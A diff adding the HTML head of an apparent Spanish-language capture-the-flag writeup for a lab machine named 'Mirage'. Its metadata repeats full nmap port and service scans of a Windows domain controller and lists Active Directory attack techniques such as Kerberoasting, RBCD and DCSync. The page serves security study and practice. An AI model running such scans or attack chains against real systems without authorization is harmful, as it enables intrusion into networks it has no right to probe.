@@ -1,0 +1,1461 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Mirage | Borhub Blog</title>
+<meta name="keywords" content="Hard, ActiveDirectory, NFS, DNS-Update, Kerberoasting, winPEAS, ForceChangePassword, AccountDisable, LogonHours, ReadGMSAPassword, ESC10, RBCD, DCSync-Attack">
+<meta name="description" content="
+Reconocimiento
+❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.78 -oG ports
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-21 16:49 &#43;0200
+Initiating SYN Stealth Scan at 16:49
+Scanning 10.10.11.78 [65535 ports]
+Discovered open port 111/tcp on 10.10.11.78
+Discovered open port 53/tcp on 10.10.11.78
+Discovered open port 445/tcp on 10.10.11.78
+Discovered open port 139/tcp on 10.10.11.78
+Discovered open port 135/tcp on 10.10.11.78
+Discovered open port 2049/tcp on 10.10.11.78
+Discovered open port 51863/tcp on 10.10.11.78
+Discovered open port 51920/tcp on 10.10.11.78
+Discovered open port 47001/tcp on 10.10.11.78
+Discovered open port 51885/tcp on 10.10.11.78
+Discovered open port 49667/tcp on 10.10.11.78
+Discovered open port 9389/tcp on 10.10.11.78
+Discovered open port 51856/tcp on 10.10.11.78
+Discovered open port 5985/tcp on 10.10.11.78
+Discovered open port 51864/tcp on 10.10.11.78
+Discovered open port 51879/tcp on 10.10.11.78
+Discovered open port 49669/tcp on 10.10.11.78
+Discovered open port 3269/tcp on 10.10.11.78
+Discovered open port 49664/tcp on 10.10.11.78
+Discovered open port 464/tcp on 10.10.11.78
+Discovered open port 389/tcp on 10.10.11.78
+Discovered open port 4222/tcp on 10.10.11.78
+Discovered open port 593/tcp on 10.10.11.78
+Discovered open port 49666/tcp on 10.10.11.78
+Discovered open port 51913/tcp on 10.10.11.78
+Discovered open port 51913/tcp on 10.10.11.78
+Discovered open port 4222/tcp on 10.10.11.78
+Discovered open port 389/tcp on 10.10.11.78
+Discovered open port 464/tcp on 10.10.11.78
+Discovered open port 49665/tcp on 10.10.11.78
+Discovered open port 636/tcp on 10.10.11.78
+Discovered open port 88/tcp on 10.10.11.78
+Discovered open port 57944/tcp on 10.10.11.78
+Discovered open port 3268/tcp on 10.10.11.78
+Completed SYN Stealth Scan at 16:49, 15.62s elapsed (65535 total ports)
+Nmap scan report for 10.10.11.78
+Host is up, received user-set (0.035s latency).
+Scanned at 2025-07-21 16:49:25 CEST for 16s
+Not shown: 65439 closed tcp ports (reset), 66 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+111/tcp   open  rpcbind          syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+2049/tcp  open  nfs              syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+4222/tcp  open  vrml-multi-use   syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+47001/tcp open  winrm            syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49665/tcp open  unknown          syn-ack ttl 127
+49666/tcp open  unknown          syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49669/tcp open  unknown          syn-ack ttl 127
+51856/tcp open  unknown          syn-ack ttl 127
+51863/tcp open  unknown          syn-ack ttl 127
+51864/tcp open  unknown          syn-ack ttl 127
+51879/tcp open  unknown          syn-ack ttl 127
+51885/tcp open  unknown          syn-ack ttl 127
+51913/tcp open  unknown          syn-ack ttl 127
+51920/tcp open  unknown          syn-ack ttl 127
+57944/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds
+           Raw packets sent: 86448 (3.804MB) | Rcvd: 66503 (2.660MB)
+❯ ports.py ports
+
+🔍 Puertos encontrados: 
+  ➜  53 
+  ➜  88 
+  ➜  111 
+  ➜  135 
+  ➜  139 
+  ➜  389 
+  ➜  445 
+  ➜  464 
+  ➜  593 
+  ➜  636 
+  ➜  2049 
+  ➜  3268 
+  ➜  3269 
+  ➜  4222 
+  ➜  5985 
+  ➜  9389 
+  ➜  47001 
+  ➜  49664 
+  ➜  49665 
+  ➜  49666 
+  ➜  49667 
+  ➜  49669 
+  ➜  51856 
+  ➜  51863 
+  ➜  51864 
+  ➜  51879 
+  ➜  51885 
+  ➜  51913 
+  ➜  51920 
+  ➜  57944 
+
+¡Puertos copiados en el portapapeles!
+❯ sudo nmap -sCV -p 53,88,111,135,139,389,445,464,593,636,2049,3268,3269,4222,5985,9389,47001,49664,49665,49666,49667,49669,51856,51863,51864,51879,51885,51913,51920,57944 10.10.11.78 -oN targeted
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-21 16:51 &#43;0200
+Nmap scan report for 10.10.11.78
+Host is up (0.11s latency).
+
+PORT      STATE SERVICE         VERSION
+53/tcp    open  domain          (generic dns response: SERVFAIL)
+| fingerprint-strings: 
+|   DNS-SD-TCP: 
+|     _services
+|     _dns-sd
+|     _udp
+|_    local
+88/tcp    open  kerberos-sec    Microsoft Windows Kerberos (server time: 2025-07-21 21:51:31Z)
+111/tcp   open  rpcbind         2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp   open  msrpc           Microsoft Windows RPC
+139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
+389/tcp   open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+| Not valid before: 2025-07-04T19:58:41
+|_Not valid after:  2105-07-04T19:58:41
+|_ssl-date: TLS randomness does not represent time
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+| Not valid before: 2025-07-04T19:58:41
+|_Not valid after:  2105-07-04T19:58:41
+2049/tcp  open  nlockmgr        1-4 (RPC #100021)
+3268/tcp  open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+| Not valid before: 2025-07-04T19:58:41
+|_Not valid after:  2105-07-04T19:58:41
+|_ssl-date: TLS randomness does not represent time
+3269/tcp  open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+| Not valid before: 2025-07-04T19:58:41
+|_Not valid after:  2105-07-04T19:58:41
+|_ssl-date: TLS randomness does not represent time
+4222/tcp  open  vrml-multi-use?
+| fingerprint-strings: 
+|   GenericLines: 
+|     INFO {&#34;server_id&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;server_name&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;version&#34;:&#34;2.11.3&#34;,&#34;proto&#34;:1,&#34;git_commit&#34;:&#34;a82cfda&#34;,&#34;go&#34;:&#34;go1.24.2&#34;,&#34;host&#34;:&#34;0.0.0.0&#34;,&#34;port&#34;:4222,&#34;headers&#34;:true,&#34;auth_required&#34;:true,&#34;max_payload&#34;:1048576,&#34;jetstream&#34;:true,&#34;client_id&#34;:2714,&#34;client_ip&#34;:&#34;10.10.15.254&#34;,&#34;xkey&#34;:&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL&#34;} 
+|     -ERR &#39;Authorization Violation&#39;
+|   GetRequest: 
+|     INFO {&#34;server_id&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;server_name&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;version&#34;:&#34;2.11.3&#34;,&#34;proto&#34;:1,&#34;git_commit&#34;:&#34;a82cfda&#34;,&#34;go&#34;:&#34;go1.24.2&#34;,&#34;host&#34;:&#34;0.0.0.0&#34;,&#34;port&#34;:4222,&#34;headers&#34;:true,&#34;auth_required&#34;:true,&#34;max_payload&#34;:1048576,&#34;jetstream&#34;:true,&#34;client_id&#34;:2715,&#34;client_ip&#34;:&#34;10.10.15.254&#34;,&#34;xkey&#34;:&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL&#34;} 
+|     -ERR &#39;Authorization Violation&#39;
+|   HTTPOptions: 
+|     INFO {&#34;server_id&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;server_name&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;version&#34;:&#34;2.11.3&#34;,&#34;proto&#34;:1,&#34;git_commit&#34;:&#34;a82cfda&#34;,&#34;go&#34;:&#34;go1.24.2&#34;,&#34;host&#34;:&#34;0.0.0.0&#34;,&#34;port&#34;:4222,&#34;headers&#34;:true,&#34;auth_required&#34;:true,&#34;max_payload&#34;:1048576,&#34;jetstream&#34;:true,&#34;client_id&#34;:2716,&#34;client_ip&#34;:&#34;10.10.15.254&#34;,&#34;xkey&#34;:&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL&#34;} 
+|     -ERR &#39;Authorization Violation&#39;
+|   NULL: 
+|     INFO {&#34;server_id&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;server_name&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;version&#34;:&#34;2.11.3&#34;,&#34;proto&#34;:1,&#34;git_commit&#34;:&#34;a82cfda&#34;,&#34;go&#34;:&#34;go1.24.2&#34;,&#34;host&#34;:&#34;0.0.0.0&#34;,&#34;port&#34;:4222,&#34;headers&#34;:true,&#34;auth_required&#34;:true,&#34;max_payload&#34;:1048576,&#34;jetstream&#34;:true,&#34;client_id&#34;:2713,&#34;client_ip&#34;:&#34;10.10.15.254&#34;,&#34;xkey&#34;:&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL&#34;} 
+|_    -ERR &#39;Authentication Timeout&#39;
+5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf          .NET Message Framing
+47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc           Microsoft Windows RPC
+49665/tcp open  msrpc           Microsoft Windows RPC
+49666/tcp open  msrpc           Microsoft Windows RPC
+49667/tcp open  msrpc           Microsoft Windows RPC
+49669/tcp open  msrpc           Microsoft Windows RPC
+51856/tcp open  msrpc           Microsoft Windows RPC
+51863/tcp open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
+51864/tcp open  msrpc           Microsoft Windows RPC
+51879/tcp open  msrpc           Microsoft Windows RPC
+51885/tcp open  msrpc           Microsoft Windows RPC
+51913/tcp open  msrpc           Microsoft Windows RPC
+51920/tcp open  msrpc           Microsoft Windows RPC
+57944/tcp open  msrpc           Microsoft Windows RPC
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port53-TCP:V=7.97%I=7%D=7/21%Time=687E540E%P=x86_64-pc-linux-gnu%r(DNS-
+SF:SD-TCP,30,&#34;\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
+SF:_udp\x05local\0\0\x0c\0\x01&#34;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port4222-TCP:V=7.97%I=7%D=7/21%Time=687E53FB%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,1D2,&#34;INFO\x20{\&#34;server_id\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X
+SF:2UA7GZ23H6BFSXI26M\&#34;,\&#34;server_name\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II5
+SF:7L6M4X2UA7GZ23H6BFSXI26M\&#34;,\&#34;version\&#34;:\&#34;2\.11\.3\&#34;,\&#34;proto\&#34;:1,\&#34;git_c
+SF:ommit\&#34;:\&#34;a82cfda\&#34;,\&#34;go\&#34;:\&#34;go1\.24\.2\&#34;,\&#34;host\&#34;:\&#34;0\.0\.0\.0\&#34;,\&#34;por
+SF:t\&#34;:4222,\&#34;headers\&#34;:true,\&#34;auth_required\&#34;:true,\&#34;max_payload\&#34;:104857
+SF:6,\&#34;jetstream\&#34;:true,\&#34;client_id\&#34;:2713,\&#34;client_ip\&#34;:\&#34;10\.10\.15\.254
+SF:\&#34;,\&#34;xkey\&#34;:\&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\
+SF:&#34;}\x20\r\n-ERR\x20&#39;Authentication\x20Timeout&#39;\r\n&#34;)%r(GenericLines,1D3,
+SF:&#34;INFO\x20{\&#34;server_id\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ2
+SF:3H6BFSXI26M\&#34;,\&#34;server_name\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2
+SF:UA7GZ23H6BFSXI26M\&#34;,\&#34;version\&#34;:\&#34;2\.11\.3\&#34;,\&#34;proto\&#34;:1,\&#34;git_commit\&#34;
+SF::\&#34;a82cfda\&#34;,\&#34;go\&#34;:\&#34;go1\.24\.2\&#34;,\&#34;host\&#34;:\&#34;0\.0\.0\.0\&#34;,\&#34;port\&#34;:422
+SF:2,\&#34;headers\&#34;:true,\&#34;auth_required\&#34;:true,\&#34;max_payload\&#34;:1048576,\&#34;jet
+SF:stream\&#34;:true,\&#34;client_id\&#34;:2714,\&#34;client_ip\&#34;:\&#34;10\.10\.15\.254\&#34;,\&#34;xk
+SF:ey\&#34;:\&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\&#34;}\x20\
+SF:r\n-ERR\x20&#39;Authorization\x20Violation&#39;\r\n&#34;)%r(GetRequest,1D3,&#34;INFO\x2
+SF:0{\&#34;server_id\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI
+SF:26M\&#34;,\&#34;server_name\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H
+SF:6BFSXI26M\&#34;,\&#34;version\&#34;:\&#34;2\.11\.3\&#34;,\&#34;proto\&#34;:1,\&#34;git_commit\&#34;:\&#34;a82cf
+SF:da\&#34;,\&#34;go\&#34;:\&#34;go1\.24\.2\&#34;,\&#34;host\&#34;:\&#34;0\.0\.0\.0\&#34;,\&#34;port\&#34;:4222,\&#34;head
+SF:ers\&#34;:true,\&#34;auth_required\&#34;:true,\&#34;max_payload\&#34;:1048576,\&#34;jetstream\&#34;
+SF::true,\&#34;client_id\&#34;:2715,\&#34;client_ip\&#34;:\&#34;10\.10\.15\.254\&#34;,\&#34;xkey\&#34;:\&#34;X
+SF:C3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\&#34;}\x20\r\n-ERR\
+SF:x20&#39;Authorization\x20Violation&#39;\r\n&#34;)%r(HTTPOptions,1D3,&#34;INFO\x20{\&#34;ser
+SF:ver_id\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\&#34;,\
+SF:&#34;server_name\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI2
+SF:6M\&#34;,\&#34;version\&#34;:\&#34;2\.11\.3\&#34;,\&#34;proto\&#34;:1,\&#34;git_commit\&#34;:\&#34;a82cfda\&#34;,\&#34;
+SF:go\&#34;:\&#34;go1\.24\.2\&#34;,\&#34;host\&#34;:\&#34;0\.0\.0\.0\&#34;,\&#34;port\&#34;:4222,\&#34;headers\&#34;:t
+SF:rue,\&#34;auth_required\&#34;:true,\&#34;max_payload\&#34;:1048576,\&#34;jetstream\&#34;:true,\
+SF:&#34;client_id\&#34;:2716,\&#34;client_ip\&#34;:\&#34;10\.10\.15\.254\&#34;,\&#34;xkey\&#34;:\&#34;XC3AIA5L
+SF:H4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\&#34;}\x20\r\n-ERR\x20&#39;Aut
+SF:horization\x20Violation&#39;\r\n&#34;);
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-07-21T21:52:27
+|_  start_date: N/A
+|_clock-skew: 6h59m47s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 93.54 seconds
+NFS Misconfig
+Vemos que el dominio tiene el puerto 111 (NFS) abierto y como no tenemos nada más por donde tirar, vamos ver que contiene, y en el caso de que podamos y haya algún tipo de archivo, descargarnos-lo.">
+<meta name="author" content="Borhub">
+<link rel="canonical" href="https://borhuub.github.io/writeups/mirage/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.c0e954cd1f465543aa5f135100881f7c6e5386adf796576c5f6fb72a8cabde46.css" integrity="sha256-wOlUzR9GVUOqXxNRAIgffG5Thq33lldsX2&#43;3Koyr3kY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="16x16" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="32x32" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="apple-touch-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="mask-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://borhuub.github.io/writeups/mirage/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://borhuub.github.io/writeups/mirage/">
+  <meta property="og:site_name" content="Borhub Blog">
+  <meta property="og:title" content="Mirage">
+  <meta property="og:description" content="
+Reconocimiento ❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.78 -oG ports Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-21 16:49 &#43;0200 Initiating SYN Stealth Scan at 16:49 Scanning 10.10.11.78 [65535 ports] Discovered open port 111/tcp on 10.10.11.78 Discovered open port 53/tcp on 10.10.11.78 Discovered open port 445/tcp on 10.10.11.78 Discovered open port 139/tcp on 10.10.11.78 Discovered open port 135/tcp on 10.10.11.78 Discovered open port 2049/tcp on 10.10.11.78 Discovered open port 51863/tcp on 10.10.11.78 Discovered open port 51920/tcp on 10.10.11.78 Discovered open port 47001/tcp on 10.10.11.78 Discovered open port 51885/tcp on 10.10.11.78 Discovered open port 49667/tcp on 10.10.11.78 Discovered open port 9389/tcp on 10.10.11.78 Discovered open port 51856/tcp on 10.10.11.78 Discovered open port 5985/tcp on 10.10.11.78 Discovered open port 51864/tcp on 10.10.11.78 Discovered open port 51879/tcp on 10.10.11.78 Discovered open port 49669/tcp on 10.10.11.78 Discovered open port 3269/tcp on 10.10.11.78 Discovered open port 49664/tcp on 10.10.11.78 Discovered open port 464/tcp on 10.10.11.78 Discovered open port 389/tcp on 10.10.11.78 Discovered open port 4222/tcp on 10.10.11.78 Discovered open port 593/tcp on 10.10.11.78 Discovered open port 49666/tcp on 10.10.11.78 Discovered open port 51913/tcp on 10.10.11.78 Discovered open port 51913/tcp on 10.10.11.78 Discovered open port 4222/tcp on 10.10.11.78 Discovered open port 389/tcp on 10.10.11.78 Discovered open port 464/tcp on 10.10.11.78 Discovered open port 49665/tcp on 10.10.11.78 Discovered open port 636/tcp on 10.10.11.78 Discovered open port 88/tcp on 10.10.11.78 Discovered open port 57944/tcp on 10.10.11.78 Discovered open port 3268/tcp on 10.10.11.78 Completed SYN Stealth Scan at 16:49, 15.62s elapsed (65535 total ports) Nmap scan report for 10.10.11.78 Host is up, received user-set (0.035s latency). Scanned at 2025-07-21 16:49:25 CEST for 16s Not shown: 65439 closed tcp ports (reset), 66 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 111/tcp open rpcbind syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 2049/tcp open nfs syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 4222/tcp open vrml-multi-use syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49669/tcp open unknown syn-ack ttl 127 51856/tcp open unknown syn-ack ttl 127 51863/tcp open unknown syn-ack ttl 127 51864/tcp open unknown syn-ack ttl 127 51879/tcp open unknown syn-ack ttl 127 51885/tcp open unknown syn-ack ttl 127 51913/tcp open unknown syn-ack ttl 127 51920/tcp open unknown syn-ack ttl 127 57944/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds Raw packets sent: 86448 (3.804MB) | Rcvd: 66503 (2.660MB) ❯ ports.py ports 🔍 Puertos encontrados: ➜ 53 ➜ 88 ➜ 111 ➜ 135 ➜ 139 ➜ 389 ➜ 445 ➜ 464 ➜ 593 ➜ 636 ➜ 2049 ➜ 3268 ➜ 3269 ➜ 4222 ➜ 5985 ➜ 9389 ➜ 47001 ➜ 49664 ➜ 49665 ➜ 49666 ➜ 49667 ➜ 49669 ➜ 51856 ➜ 51863 ➜ 51864 ➜ 51879 ➜ 51885 ➜ 51913 ➜ 51920 ➜ 57944 ¡Puertos copiados en el portapapeles! ❯ sudo nmap -sCV -p 53,88,111,135,139,389,445,464,593,636,2049,3268,3269,4222,5985,9389,47001,49664,49665,49666,49667,49669,51856,51863,51864,51879,51885,51913,51920,57944 10.10.11.78 -oN targeted Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-21 16:51 &#43;0200 Nmap scan report for 10.10.11.78 Host is up (0.11s latency). PORT STATE SERVICE VERSION 53/tcp open domain (generic dns response: SERVFAIL) | fingerprint-strings: | DNS-SD-TCP: | _services | _dns-sd | _udp |_ local 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-21 21:51:31Z) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE | Not valid before: 2025-07-04T19:58:41 |_Not valid after: 2105-07-04T19:58:41 |_ssl-date: TLS randomness does not represent time 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE | Not valid before: 2025-07-04T19:58:41 |_Not valid after: 2105-07-04T19:58:41 2049/tcp open nlockmgr 1-4 (RPC #100021) 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE | Not valid before: 2025-07-04T19:58:41 |_Not valid after: 2105-07-04T19:58:41 |_ssl-date: TLS randomness does not represent time 3269/tcp open ssl/ldap 